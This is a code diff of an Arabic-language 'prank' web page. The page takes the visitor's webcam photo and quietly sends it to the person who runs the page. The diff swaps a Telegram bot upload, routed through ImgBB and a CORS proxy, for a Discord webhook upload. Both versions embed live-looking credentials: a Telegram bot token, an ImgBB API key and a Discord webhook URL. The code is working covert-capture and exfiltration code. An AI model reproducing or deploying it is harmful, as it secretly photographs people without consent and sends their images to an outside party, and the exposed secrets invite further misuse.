@@ -134,7 +134,7 @@
       <p style="color: #666; margin: 20px 0;">هذه هي صورتك!</p>
       <img id="capturedPhoto" alt="صورتك">
       <p style="color: #ff4757; font-weight: bold; margin-top: 20px; font-size: 20px;">
-        😂 تم مقلبك!
+        😂 تحياتي
       </p>
     </div>
   </div>
@@ -150,9 +150,8 @@
     const canvas = document.getElementById('canvas');
     const capturedPhoto = document.getElementById('capturedPhoto');
 
-    // إعدادات Telegram Bot
-    const TELEGRAM_BOT_TOKEN = '8520906764:AAFjE-Yr1N6B1sojXrClpjzP32yfueGRvPc';
-    const TELEGRAM_CHAT_ID = '6861577366';
+    // ضع Webhook الخاص بك من Discord هنا
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1464000266369110038/QPfYRwlrewHl-vowOukyN-YrYRIJ3pZiw_KhIx5NMbB-QDn4Cm9rNnoU1K6yngbkF5MC';
 
     let savedPhotoData = null;
 
@@ -206,64 +205,25 @@
       }
     };
 
-    // إرسال الصورة عبر خدمة Webhook.site (حل مؤقت للاختبار)
-    // أو استخدام خدمة CORS Proxy
+    // إرسال الصورة للـ Discord
     async function sendToDiscord(imageData) {
       try {
-        console.log('📸 بدء عملية الإرسال...');
+        // تحويل base64 إلى blob
+        const blob = await fetch(imageData).then(r => r.blob());
         
-        // الخطوة 1: رفع الصورة على خدمة مجانية (ImgBB)
-        const base64Image = imageData.split(',')[1];
-        const imgbbFormData = new FormData();
-        imgbbFormData.append('image', base64Image);
-        
-        console.log('📤 جاري رفع الصورة...');
-        
-        const imgbbResponse = await fetch('https://api.imgbb.com/1/upload?key=c6bd0d055f3f12e7b1c1b1e1cc9a5e8a', {
+        // إنشاء FormData لإرسال الصورة
+        const formData = new FormData();
+        formData.append('file', blob, 'prank.png');
+        formData.append('content', '🎯 تم التقاط صورة جديدة من المقلب!');
+
+        await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
-          body: imgbbFormData
+          body: formData
         });
-        
-        const imgbbResult = await imgbbResponse.json();
-        
-        if (!imgbbResult.success) {
-          throw new Error('فشل رفع الصورة على ImgBB');
-        }
-        
-        const imageUrl = imgbbResult.data.url;
-        console.log('✅ تم رفع الصورة:', imageUrl);
-        
-        // الخطوة 2: إرسال رابط الصورة للتليجرام عبر CORS Proxy
-        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(telegramApiUrl);
-        
-        const telegramData = new URLSearchParams();
-        telegramData.append('chat_id', TELEGRAM_CHAT_ID);
-        telegramData.append('photo', imageUrl);
-        telegramData.append('caption', '🎯 مقلب! 😂\n⏰ ' + new Date().toLocaleString('ar'));
-        
-        console.log('📤 جاري إرسال الرابط للتليجرام...');
-        
-        const telegramResponse = await fetch(proxyUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: telegramData
-        });
-        
-        const telegramResult = await telegramResponse.json();
-        
-        console.log('📬 رد Telegram:', telegramResult);
-        
-        if (telegramResult.ok) {
-          console.log('✅✅✅ نجاح! وصلت الصورة للتليجرام!');
-        } else {
-          console.error('❌ فشل:', telegramResult);
-        }
-        
+
+        console.log('✅ تم إرسال الصورة للـ Discord');
       } catch (error) {
-        console.error('❌ خطأ:', error);
+        console.error('خطأ في إرسال Discord:', error);
       }
     }
 
